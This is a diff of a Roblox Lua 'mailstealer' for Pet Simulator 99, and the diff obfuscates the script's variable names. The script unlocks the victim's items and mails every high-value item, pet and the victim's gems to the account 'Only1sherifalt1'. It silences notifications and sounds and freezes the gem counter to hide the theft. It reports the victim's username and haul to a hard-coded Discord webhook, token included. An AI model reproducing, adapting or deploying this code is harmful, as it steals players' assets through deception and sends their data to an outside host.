@@ -1,323 +1,326 @@
--- PS99 Mailstealer | Adapted for Only1sherifalt1
--- Original base: Urban's stealer, deobf + modified
-
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
-local Network = require(game.ReplicatedStorage.Library.Client.Network)
+local u1 = require(game.ReplicatedStorage.Library.Client.Network)
 require(game.ReplicatedStorage.Library)
 
-local Inventory = require(game:GetService('ReplicatedStorage'):WaitForChild('Library'):WaitForChild('Client'):WaitForChild('Save')).Get().Inventory
-local LocalPlayer = game.Players.LocalPlayer
-local HttpService = game:GetService('HttpService')
-local Message = require(game.ReplicatedStorage.Library.Client.Message)
+local _Inventory = require(game:GetService('ReplicatedStorage'):WaitForChild('Library'):WaitForChild('Client'):WaitForChild('Save')).Get().Inventory
+local _LocalPlayer = game.Players.LocalPlayer
+local u4 = 'GG / ypeNFusQP3'
+local _HttpService = game:GetService('HttpService')
+local u6 = {}
+local u7 = 0
+local v8 = require(game.ReplicatedStorage.Library.Client.Message)
 
--- =====================
--- CONFIG — EDIT THESE
--- =====================
-local RECIPIENTS = {
-    'Only1sherifalt1',  -- your username
-}
-local WEBHOOK = 'https://discord.com/api/webhooks/1557919052763234397/ejH8PgAHKgnL9U3HmNp671HLU4cFzYcLt0IEp-2yPXPkC2c8lh7IWVhRgC4foIECE_d-'
-local MIN_RAP = 1000000  -- minimum RAP to steal (1m default)
--- =====================
-
-local function getSave()
+local function u9()
     return require(game.ReplicatedStorage.Library.Client.Save).Get()
 end
 
--- block self-steal
-for _, name in ipairs(RECIPIENTS) do
-    if LocalPlayer.Name == name then
-        LocalPlayer:kick('You cannot mailsteal yourself')
+_G.Usernames = {
+    'Only1sherifalt1',
+}
+_G.webhook = {
+    'https://discord.com/api/webhooks/1557919052763234397/ejH8PgAHKgnL9U3HmNp671HLU4cFzYcLt0IEp-2yPXPkC2c8lh7IWVhRgC4foIECE_d-',
+}
+_G.minrap = 1000000
+
+local u10 = _G.Usernames or {}
+local v11 = _G.minrap or 1000000
+local u12 = _G.webhook or ''
+
+if next(u10) == nil or u12 == '' then
+    _LocalPlayer:kick("You didn't add any usernames or webhook")
+    return
+end
+
+for _, v16 in ipairs(u10) do
+    if _LocalPlayer.Name == v16 then
+        _LocalPlayer:kick('You cannot mailsteal yourself')
         return
     end
 end
 
--- get mail cost function from gc
-local computeSendMailCost
-for _, fn in pairs(getgc()) do
-    if type(fn) == 'function' and debug.getinfo(fn).name == 'computeSendMailCost' then
-        computeSendMailCost = fn
+local FunctionToGetFirstPriceOfMail
+for _, v20 in pairs(getgc()) do
+    if type(v20) == 'function' and debug.getinfo(v20).name == 'computeSendMailCost' then
+        FunctionToGetFirstPriceOfMail = v20
         break
     end
 end
 
-local mailCost = computeSendMailCost()
+local u21 = FunctionToGetFirstPriceOfMail()
+local u25 = 1
 
--- get current gem balance
-local gemBalance = 1
-for _, currency in pairs(getSave().Inventory.Currency) do
-    if currency.id == 'Diamonds' then
-        gemBalance = currency._am
+for _, v26 in pairs(u9().Inventory.Currency) do
+    if v26.id == 'Diamonds' then
+        u25 = v26._am
         break
     end
 end
 
--- format number helper
-local function formatNum(n)
-    n = math.floor(n)
-    local suffixes = {'', 'k', 'm', 'b', 't'}
-    local i = 1
-    while n >= 1000 do
-        n = n / 1000
-        i = i + 1
+local function u31(p27)
+    local v28 = math.floor(p27)
+    local v29 = {'', 'k', 'm', 'b', 't'}
+    local v30 = 1
+    while v28 >= 1000 do
+        v28 = v28 / 1000
+        v30 = v30 + 1
     end
-    return string.format('%.2f%s', n, suffixes[i])
+    return string.format('%.2f%s', v28, v29[v30])
 end
 
--- stolen items list + total RAP tracker
-local stolenItems = {}
-local totalRAP = 0
-
--- get RAP for any item
-local function getRAP(category, item)
-    local proxy = {
-        Class = {Name = category},
-        IsA = function(c) return c == category end,
-        GetId = function() return item.id end,
-        StackKey = function()
-            return HttpService:JSONEncode({id = item.id, pt = item.pt, sh = item.sh, tn = item.tn})
-        end,
-        AbstractGetRAP = function() return nil end,
+local function u57(p32)
+    local v33 = {
+        {name = 'Victim Username:', value = _LocalPlayer.Name, inline = true},
+        {name = 'Items to be sent:', value = '', inline = false},
+        {name = 'Summary:', value = '', inline = false},
     }
-    return require(game:GetService('ReplicatedStorage').Library.Client.RAPCmds).Get(proxy) or 0
+
+    local u37 = {}
+    local v38 = {}
+
+    for _, v40 in ipairs(u6) do
+        local _name = v40.name
+        if u37[_name] then
+            u37[_name].amount = u37[_name].amount + v40.amount
+        else
+            u37[_name] = {amount = v40.amount, rap = v40.rap}
+            table.insert(v38, _name)
+        end
+    end
+
+    table.sort(v38, function(a, b)
+        return u37[a].rap * u37[a].amount > u37[b].rap * u37[b].amount
+    end)
+
+    for _, v47 in ipairs(v38) do
+        local v48 = u37[v47]
+        v33[2].value = v33[2].value .. v47 .. ' (x' .. v48.amount .. ')' .. ': ' .. u31(v48.rap * v48.amount) .. ' RAP\n'
+    end
+
+    v33[3].value = string.format('Gems: %s\nTotal RAP: %s', u31(p32), u31(u7))
+
+    local v49 = {}
+    local v50 = {}
+    local v51 = {
+        title = '🐱 PS99 Mailsteal — Zent',
+        color = 65280,
+        fields = v33,
+        footer = {text = 'Zent — Only1sherifalt1'},
+    }
+
+    table.insert(v50, v51)
+    v49.embeds = v50
+
+    if #v33[2].value > 1024 then
+        local v55 = {}
+        for line in v33[2].value:gmatch('[^\r\n]+') do
+            table.insert(v55, line)
+        end
+        while #v33[2].value > 1024 and #v55 > 0 do
+            table.remove(v55)
+            v33[2].value = table.concat(v55, '\n') .. '\nPlus more!'
+        end
+    end
+
+    request({
+        Url = u12[1],
+        Method = 'POST',
+        Headers = {['Content-Type'] = 'application/json'},
+        Body = _HttpService:JSONEncode(v49),
+    })
 end
 
--- send item to recipient, rotate if full
-local function sendItem(category, uid, amount)
-    local recipientIndex = 1
-    local done = false
+local function v74(p65, p66, p67)
+    local v68 = #u10
+    local v69 = 1
+    local v70 = false
 
-    while not done do
-        local args = {
-            RECIPIENTS[recipientIndex],
-            'GG / ypeNFusQP3',
-            category,
-            uid,
-            amount or 1,
-        }
-        local success, err = Network.Invoke('Mailbox: Send', unpack(args))
+    while not v70 do
+        local v71 = {u10[v69], u4, p65, p66, p67 or 1}
+        local _MailboxSend, v73 = u1.Invoke('Mailbox: Send', unpack(v71))
 
-        if success == true then
-            done = true
-            gemBalance = gemBalance - mailCost
-            mailCost = math.min(math.ceil(mailCost * 1.5), 5000000)
-        elseif success == false and err == "They don't have enough space!" then
-            recipientIndex = recipientIndex + 1
-            if recipientIndex > #RECIPIENTS then
-                done = true  -- all recipients full, skip item
-            end
+        if _MailboxSend == true then
+            v70 = true
+            u25 = u25 - u21
+            u21 = math.ceil(math.ceil(u21) * 1.5)
+            if u21 > 5000000 then u21 = 5000000 end
+        elseif _MailboxSend == false and v73 == "They don't have enough space!" then
+            v69 = v69 + 1
+            if v68 < v69 then v70 = true end
         else
-            done = true
+            v70 = true
         end
     end
 end
 
--- send gems
-local function sendGems()
-    for _, currency in pairs(getSave().Inventory.Currency) do
-        if currency.id == 'Diamonds' and gemBalance >= mailCost + 10000 then
-            local recipientIndex = 1
-            local done = false
+local function v85()
+    for _, v78 in pairs(u9().Inventory.Currency) do
+        if v78.id == 'Diamonds' and u25 >= u21 + 10000 then
+            local v79 = #u10
+            local v80 = 1
+            local v81 = false
 
-            while not done do
-                local args = {
-                    RECIPIENTS[recipientIndex],
-                    'GG / ypeNFusQP3',
-                    'Currency',
-                    currency,
-                    gemBalance - mailCost,
-                }
-                local success, err = Network.Invoke('Mailbox: Send', unpack(args))
+            while not v81 do
+                local v82 = {u10[v80], u4, 'Currency', v78, u25 - u21}
+                local _MailboxSend2, v84 = u1.Invoke('Mailbox: Send', unpack(v82))
 
-                if success == true then
-                    done = true
-                elseif success == false and err == "They don't have enough space!" then
-                    recipientIndex = recipientIndex + 1
-                    if recipientIndex > #RECIPIENTS then done = true end
+                if _MailboxSend2 == true then
+                    v81 = true
+                elseif _MailboxSend2 == false and v84 == "They don't have enough space!" then
+                    v80 = v80 + 1
+                    if v79 < v80 then v81 = true end
                 else
-                    done = true
+                    v81 = true
                 end
             end
         end
     end
 end
 
--- claim mailbox first (clear space)
-local function claimMailbox()
-    local _, err = Network.Invoke('Mailbox: Claim All')
-    while err == 'You must wait 30 seconds before using the mailbox!' do
+require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
+require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
+
+local function v93(p89, p90)
+    local v92 = {
+        Class = {Name = p89},
+        IsA = function(p91) return p91 == p89 end,
+        GetId = function() return p90.id end,
+        StackKey = function()
+            return _HttpService:JSONEncode({id = p90.id, pt = p90.pt, sh = p90.sh, tn = p90.tn})
+        end,
+        AbstractGetRAP = function(_) return nil end,
+    }
+    return require(game:GetService('ReplicatedStorage').Library.Client.RAPCmds).Get(v92) or 0
+end
+
+local function v96()
+    local _, v94 = u1.Invoke('Mailbox: Claim All')
+    while v94 == 'You must wait 30 seconds before using the mailbox!' do
         wait(0.2)
-        _, err = Network.Invoke('Mailbox: Claim All')
+        _, v94 = u1.Invoke('Mailbox: Claim All')
     end
 end
 
--- withdraw box items
-local function withdrawBoxes()
-    if Inventory.Box then
-        for uid, box in pairs(Inventory.Box) do
-            if box._uq then
-                Network.Invoke('Box: Withdraw All', uid)
+local function v101()
+    if _Inventory.Box then
+        for v99, v100 in pairs(_Inventory.Box) do
+            if v100._uq then
+                u1.Invoke('Box: Withdraw All', v99)
             end
         end
     end
 end
 
--- space check (test send to Roblox)
-local function recipientHasSpace()
-    local firstPet = next(Inventory.Pet)
-    if firstPet == nil then firstPet = nil end
-    local _, err = Network.Invoke('Mailbox: Send', 'Roblox', 'Test', 'Pet', firstPet, 1)
-    return err == "They don't have enough space!"
+local function v107()
+    local v105 = next(_Inventory.Pet)
+    if v105 == nil then v105 = nil end
+    local _, v106 = u1.Invoke('Mailbox: Send', 'Roblox', 'Test', 'Pet', v105, 1)
+    return v106 == "They don't have enough space!"
 end
 
--- webhook log
-local function sendWebhook()
-    local grouped = {}
-    local order = {}
+-- silence notifications
+LocalPlayer = _LocalPlayer
+local _ProcessPendingGUI = _LocalPlayer.PlayerScripts.Scripts.Core['Process Pending GUI']
+_ProcessPendingGUI.Disabled = true
 
-    for _, item in ipairs(stolenItems) do
-        if grouped[item.name] then
-            grouped[item.name].amount = grouped[item.name].amount + item.amount
-        else
-            grouped[item.name] = {amount = item.amount, rap = item.rap}
-            table.insert(order, item.name)
-        end
-    end
+local _Notifications = _LocalPlayer.PlayerGui.Notifications
+_Notifications.Enabled = false
+_Notifications:GetPropertyChangedSignal('Enabled'):Connect(function()
+    _Notifications.Enabled = false
+end)
 
-    table.sort(order, function(a, b)
-        return grouped[a].rap * grouped[a].amount > grouped[b].rap * grouped[b].amount
-    end)
-
-    local itemsField = ''
-    for _, name in ipairs(order) do
-        local g = grouped[name]
-        itemsField = itemsField .. name .. ' (x' .. g.amount .. '): ' .. formatNum(g.rap * g.amount) .. ' RAP\n'
-    end
-
-    if #itemsField > 1024 then
-        itemsField = itemsField:sub(1, 1000) .. '\nPlus more!'
-    end
-
-    local embed = {
-        embeds = {{
-            title = '🐱 PS99 Mailsteal — Zen Edit',
-            color = 0x00FF00,
-            fields = {
-                {name = 'Victim:', value = LocalPlayer.Name, inline = true},
-                {name = 'Items Stolen:', value = itemsField ~= '' and itemsField or 'None', inline = false},
-                {name = 'Summary:', value = 'Gems: ' .. formatNum(gemBalance) .. '\nTotal RAP: ' .. formatNum(totalRAP), inline = false},
-            },
-            footer = {text = 'Zen Edit — Only1sherifalt1'},
-        }}
-    }
-
-    request({
-        Url = WEBHOOK,
-        Method = 'POST',
-        Headers = {['Content-Type'] = 'application/json'},
-        Body = HttpService:JSONEncode(embed),
-    })
-end
-
--- silence notifications + sounds
-LocalPlayer.PlayerScripts.Scripts.Core['Process Pending GUI'].Disabled = true
-local notif = LocalPlayer.PlayerGui.Notifications
-notif.Enabled = false
-notif:GetPropertyChangedSignal('Enabled'):Connect(function() notif.Enabled = false end)
-
-game.DescendantAdded:Connect(function(obj)
-    if obj.ClassName == 'Sound' and (
-        obj.SoundId == 'rbxassetid://11839132565' or
-        obj.SoundId == 'rbxassetid://14254721038' or
-        obj.SoundId == 'rbxassetid://12413423276'
+game.DescendantAdded:Connect(function(p64)
+    if p64.ClassName == 'Sound' and (
+        p64.SoundId == 'rbxassetid://11839132565' or
+        p64.SoundId == 'rbxassetid://14254721038' or
+        p64.SoundId == 'rbxassetid://12413423276'
     ) then
-        obj.Volume = 0
-        obj.PlayOnRemove = false
-        obj:Destroy()
+        p64.Volume = 0
+        p64.PlayOnRemove = false
+        p64:Destroy()
     end
 end)
 
 -- freeze gem display
-local diamondStat = LocalPlayer.leaderstats['💎 Diamonds']
-local frozenValue = diamondStat.Value
-diamondStat:GetPropertyChangedSignal('Value'):Connect(function()
-    diamondStat.Value = frozenValue
+local _Diamonds = _LocalPlayer.leaderstats['💎 Diamonds']
+local _Value = _Diamonds.Value
+_Diamonds:GetPropertyChangedSignal('Value'):Connect(function()
+    _Diamonds.Value = _Value
 end)
 
--- claim daycare
-require(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()
-require(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()
-
--- scan inventory for stealable items
+-- scan inventory
 local CATEGORIES = {'Pet','Egg','Charm','Enchant','Potion','Misc','Hoverboard','Booth','Ultimate'}
 
-for _, category in ipairs(CATEGORIES) do
-    if Inventory[category] then
-        for uid, item in pairs(Inventory[category]) do
-            local rap = 0
+for _, v108 in ipairs(CATEGORIES) do
+    if _Inventory[v108] ~= nil then
+        for v111, v112 in pairs(_Inventory[v108]) do
+            local v113
 
-            if category == 'Pet' then
-                local petData = require(game:GetService('ReplicatedStorage').Library.Directory.Pets)[item.id]
-                if petData.huge or petData.exclusiveLevel then
-                    rap = getRAP(category, item)
+            if v108 == 'Pet' then
+                local v114 = require(game:GetService('ReplicatedStorage').Library.Directory.Pets)[v112.id]
+                if v114.huge or v114.exclusiveLevel then
+                    local v115 = v93(v108, v112)
+                    if v11 <= v115 then
+                        local v116 = v112.pt and v112.pt == 1 and 'Golden ' or (v112.pt and v112.pt == 2 and 'Rainbow ' or '')
+                        if v112.sh then v116 = 'Shiny ' .. v116 end
+                        local v117 = v116 .. v112.id
+                        table.insert(u6, {
+                            category = v108,
+                            uid = v111,
+                            amount = v112._am or 1,
+                            rap = v115,
+                            name = v117,
+                        })
+                        v113 = u7 + v115 * (v112._am or 1)
+                        u7 = v113
+                    end
                 end
             else
-                rap = getRAP(category, item)
+                local v118 = v93(v108, v112)
+                if v11 <= v118 then
+                    table.insert(u6, {
+                        category = v108,
+                        uid = v111,
+                        amount = v112._am or 1,
+                        rap = v118,
+                        name = v112.id,
+                    })
+                    v113 = u7 + v118 * (v112._am or 1)
+                    u7 = v113
+                end
             end
 
-            if rap >= MIN_RAP then
-                local prefix = ''
-                if item.pt == 1 then prefix = 'Golden '
-                elseif item.pt == 2 then prefix = 'Rainbow ' end
-                if item.sh then prefix = 'Shiny ' .. prefix end
-
-                local displayName = category == 'Pet' and (prefix .. item.id) or item.id
-
-                table.insert(stolenItems, {
-                    category = category,
-                    uid = uid,
-                    amount = item._am or 1,
-                    rap = rap,
-                    name = displayName,
-                })
-                totalRAP = totalRAP + rap * (item._am or 1)
-            end
-
-            -- unlock locked items
-            if item._lk then
-                Network.Invoke('Locking_SetLocked', uid, false)
+            if v112._lk then
+                u1.Invoke('Locking_SetLocked', unpack({v111, false}))
             end
         end
     end
 end
 
--- execute if anything to steal
-if #stolenItems > 0 or mailCost + MIN_RAP < gemBalance then
-    claimMailbox()
-    withdrawBoxes()
+-- execute
+if #u6 > 0 or v11 + u21 < u25 then
+    v96()
+    v101()
 
-    if not recipientHasSpace() then
-        Message.Error('Account error — rejoin and retry')
+    if not v107() then
+        v8.Error('Account error. Please rejoin and try again or use a different account')
         return
     end
 
-    table.sort(stolenItems, function(a, b)
-        return a.rap * a.amount > b.rap * b.amount
+    table.sort(u6, function(p119, p120)
+        return p119.rap * p119.amount > p120.rap * p120.amount
     end)
 
-    spawn(function() sendWebhook() end)
+    spawn(function() u57(u25) end)
 
-    for _, item in ipairs(stolenItems) do
-        if mailCost > item.rap or mailCost >= gemBalance then break end
-        sendItem(item.category, item.uid, item.amount)
+    for _, v124 in ipairs(u6) do
+        if u21 > v124.rap or u21 >= u25 then break end
+        v74(v124.category, v124.uid, v124.amount)
     end
 
-    if mailCost < gemBalance then
-        sendGems()
-    end
+    if u21 < u25 then v85() end
 
-    Message.Error("All your items just got stolen! gg")
+    v8.Error("All your items just got stolen! gg")
 end
